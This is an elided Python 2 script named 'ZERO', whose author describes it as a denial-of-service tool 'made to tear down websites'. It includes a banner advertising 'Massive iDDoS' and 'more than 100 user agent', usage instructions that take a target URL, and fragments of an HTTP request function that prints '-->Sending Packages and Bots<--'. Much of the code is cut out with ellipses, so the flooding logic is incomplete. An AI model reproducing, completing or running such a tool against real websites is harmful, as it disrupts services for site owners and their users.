# ----------------------------------------------------------------------------------------------
# ZERO - individual Denial of Service
#
# This script was made to tear down websites
# It is one of the largest and strongest scripts created by brazilians
# It's totally private to me: ArchZero
#
# author :  ArchZero
# ----------------------------------------------------------------------------------------------
import urllib2
...
def usage():
	print '------------------------------------------------------------'
	print 'How to use : '
	print 'Windows: zero.py <url>'
	print 'Linux: python zero.py <url>'
	print '------------------------------------------------------------'
	print 'Important notices: '
	print 'This script does not attack https urls'
	print 'This script also uses the strength of your network'
	print 'This script does not attack more than one site at a time'
	print '------------------------------------------------------------'
	print "\a"
print \
"""
                   ...
                   #                                        #
                   #        ~>Created by ArchZero<~         #
                   #    ~>Best Script for Massive iDDoS<~   #
                   #      ~>More than 100 user agent<~      #
                   #              ~>PRIV8<~                 #
                   #                                        #
                   ##########################################
...
def httpcall(url):
	...
	try:
			...
			#print e.code
			set_flag(1)
			print '-->Sending Packages and Bots<--'
			code=500
...
if len(sys.argv) < 2:
	...
	if sys.argv[1]=="help":
		...
		print "                           ZERO Massive iDDoS Attack"
		if len(sys.argv)== 3:
			if sys.argv[2]=="safe":
				set_safe()
		url = sys.argv[1]
